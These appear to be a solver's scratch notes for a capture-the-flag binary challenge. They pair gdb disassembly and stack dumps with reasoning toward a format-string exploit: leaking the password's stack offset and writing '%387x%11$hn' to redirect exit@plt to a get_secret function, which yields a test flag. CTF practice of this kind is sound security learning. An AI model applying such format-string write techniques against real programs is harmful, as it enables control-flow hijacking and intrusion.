get_secret:
   0x08048713 <+0>:	push   %ebp

0x0804899b <+114>:	push   $0x0
   0x0804899d <+116>:	call   0x8048580 <exit@plt>

gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048580 <+0>:	jmp    *0x804a02c
   0x08048586 <+6>:	push   $0x40
   0x0804858b <+11>:	jmp    0x80484f0
End of assembler dump.
(gdb) 

   
x/2x 0x8048580
0x8048580 <exit@plt>:	0xa02c25ff	0x40680804


(gdb) set {int}0x804858c=0x0183
(gdb) disas 0x8048580
Dump of assembler code for function exit@plt:
   0x08048580 <+0>:	jmp    *0x804a02c
   0x08048586 <+6>:	push   $0x40
   0x0804858b <+11>:	jmp    0x8048713 <get_secret>
End of assembler dump.
(gdb) 


> > > > > > > > > > > > > > > > > a

ffffd24c f7fa85c0 fbad2887 ffffd268 f7fea350 ffffd29c ffffd2ac f7fa8000 0 8048b40 25000a61 
78252078 a7825200 207800 b1d56b00 f7fa8000 0 ffffd2f8 8048995 ffffd2ac ffffd29c 

password gets placed on "stack" starting at 0xffffd24c (maybe really stack overflowing into the heap?)
point is... value can be accessed with $ operator in message, just a very high value

stack pointer has value 0xffffd21c at runtime so ~%12$x should do the trick to leak start of pass
actual start is %11$x

now we have arbitrary pointer that we can write; let's change the asm as in prev gdb snippet to
run get_secret


so put pointer to 2 bytes of instruction in plt of exit 0x804858c as pass
then write a value of 0x0183 via %387x%11$hn" and boom

(gdb) set {int}0x804a02c=0x8048713
(gdb) c
Continuing.
a
Good choice! Now, simply leave your message below:
> a
All done!
You can rest easy knowing that we are 100% unhackable.

For proof of concept, try accessing your message below.
You must input the correct password:
> a

a

Tada! Hope you liked our service!
Here is your secret: tjctf{test}

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) 

8713